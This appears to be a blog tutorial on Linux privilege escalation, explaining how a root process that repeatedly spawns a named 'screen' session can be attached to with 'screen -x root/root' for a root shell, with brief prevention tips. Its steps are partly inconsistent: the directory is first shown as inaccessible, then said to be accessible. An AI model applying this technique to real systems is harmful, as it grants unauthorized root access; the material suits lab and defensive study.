---
title: "Privilege Escalation in Linux Through the 'screen' Command: A Detailed Guide"
date: 2022-08-16 14:06:02
categories: [linux-privilege-escalation]
tags: [linux-privilege-escalation, screen]
---

Privilege escalation is essential for system administrators and security researchers to gain complete control over an operating system. This guide explores a specific scenario where misuse or abuse of the `screen` command can lead to privilege escalation.

## Understanding `screen`

The `screen` command allows you to start a session and open multiple virtual terminals within that session. Processes running within `screen` continue even when their windows are not visible or if the user disconnects.

## Vulnerable Configuration and Analysis

Consider a scenario where a process, running as root, repeatedly creates `screen` sessions in a loop. The relevant command found using `ps aux` would be:

```bash
ps aux
```

**Typical output (relevant part):**
```shell
root 852 0.0 0.0 2608 1756 ? Ss 00:38 021 /bin/sh -c while true; do sleep 1; find /var/run/screen/S-root -empty -exec screen -dmS root \;; done
```

This script uses `find` to check if the `/var/run/screen/S-root` directory is empty and, if so, executes `screen -dmS root`, creating a detached session named "root".

## Detailed Commands and Manual

1. **`ls` Command and Permissions**:
   Checking the directory:
   ```bash
   ls -la /var/run/screen/
   ```

   Expected output:
   ```
   total 0
   drwxr-xr-x  3 root utmp  60 Apr 26 01:17 .
   drwxr-xr-x 26 root root 740 Apr 26 05:05 ..
   drwx------  2 root root  60 Apr 26 01:17 S-root
   ```

   Trying to access `S-root`:
   ```bash
   ls /var/run/screen/S-root
   ```

   Possible output:
   ```
   ls: cannot open directory 'S-root': Permission denied
   ```

   This indicates that the directory is protected and not accessible to non-root users.

2. **Setting the `TERM` Environment Variable**:
   To connect to a `screen` session created by another user, it is crucial to correctly set the `TERM` environment variable. Set it before attempting to attach to the session:

   ```bash
   export TERM=xterm
   ```

3. **`screen -dmS` Command**:
   The `screen` manual clarifies that the command `screen -dmS name` starts a `screen` session in detached mode with a specific name, in this case, "root". If the specific directory is empty, the `find` command will execute this, establishing a new `screen` session.

## Exploitation Process

To exploit this setup:

1. **Verify Conditions**:
   Ensure the `/var/run/screen/S-root` directory is accessible and empty.

2. **Wait for Session Creation**:
   The loop will check the directory and create the session if it is empty.

3. **Attach to the Session**:
   Use the following command to connect to the created session:
   ```bash
   screen -x root/root
   ```

This will give you shell access with root privileges.

## Prevention Measures and Conclusion

To prevent such exploitation:
- Restrict the ability to create `screen` sessions to unauthorized users.
- Monitor processes that automate the creation of `screen` sessions.
- Implement strict security policies for processes running as root, especially in critical environments.

Understanding these techniques not only helps administrators secure systems but also emphasizes the importance of security in Unix-like environments.
